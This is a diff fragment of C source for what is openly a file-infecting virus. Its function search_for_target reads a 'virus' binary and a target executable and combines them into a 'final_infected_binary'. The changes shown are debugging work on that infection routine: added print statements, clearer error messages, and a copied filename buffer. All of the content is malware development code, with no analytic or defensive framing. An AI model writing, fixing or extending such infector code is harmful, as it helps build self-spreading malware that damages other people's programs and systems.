@@ -242,8 +242,14 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 		printf("I am executing this function with the parameters 'target' -->%s , 'virus-binary' ---> %s, 'size of virus' ---> %ld .\n",target_binary_file_name,virus_binary_file_name,size_of_virus);
 #endif
 
+		printf("the target %s.\n",target_binary_file_name);
 
-		long size_of_target=what_is_the_file_length(target_binary_file_name);
+		char *temp=(char *) malloc(sizeof(char) * (strlen(target_binary_file_name)+1));
+		strcpy(temp, target_binary_file_name);
+		printf("the target %s.\n",target_binary_file_name);
+		printf("the temp %s.\n",temp);
+
+		long size_of_target=what_is_the_file_length(temp);
 		long final_infected_binary[size_of_virus + size_of_target];
 		long i=0;
 
@@ -252,7 +258,7 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 		if(!pVirusFile)
 		{
 		#ifdef DEBUGMODE
-			perror("Error when creating file pointer.");
+			perror("Error when creating virus file pointer.");
 		#endif
 		}
 		else
@@ -266,12 +272,15 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 		fclose(pVirusFile);
 		pVirusFile=NULL;
 
-		FILE *pTargetBinaryFile=fopen(target_binary_file_name,"rb");
+		printf("the target %s.\n",temp);
+
+		FILE *pTargetBinaryFile=fopen(temp,"rb");
 
 		if(!pTargetBinaryFile)
 		{
 #ifdef DEBUGMODE
-			perror("Error when creating file pointer.");
+			perror("Error when creating target file pointer.");
+			printf("Error when creating a file pointer to %s.\n",target_binary_file_name);
 #endif
 		}
 		else
